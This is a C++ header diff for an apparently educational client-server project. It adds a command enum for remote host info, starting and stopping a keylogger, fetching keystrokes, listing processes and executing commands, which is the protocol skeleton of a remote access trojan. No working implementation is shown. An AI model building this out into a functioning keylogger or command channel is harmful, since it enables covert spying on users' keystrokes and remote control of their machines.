@@ -10,6 +10,21 @@
 
 using namespace std;
 
+// Command types for the client-server communication
+enum class CommandType : uint8_t {
+    HOST_INFO = 0x01,
+    START_KEYLOGGER = 0x02,
+    STOP_KEYLOGGER = 0x03,
+    GET_KEYSTROKES = 0x04,
+    LIST_PROCESSES = 0x05,
+    EXECUTE_COMMAND = 0x06,
+    SEND_MESSAGE = 0x07,
+    HOST_INFO_RESPONSE = 0x81,
+    KEY_LOG_DATA = 0x82,
+    PROCESS_LIST_RESPONSE = 0x83,
+    COMMAND_RESULT = 0x84
+};
+
 class LPTF_Server
 {
 public:
@@ -43,7 +58,7 @@ private:
     void handleConnection();
 
     // Receives a packet from the client
-    void sendResponse(LPTF_Socket &clientSocket, const std::string &message);
+    void sendPacketToClient(LPTF_Socket &clientSocket, const std::string &data, CommandType type);
 
     void handleAdminInput();
 
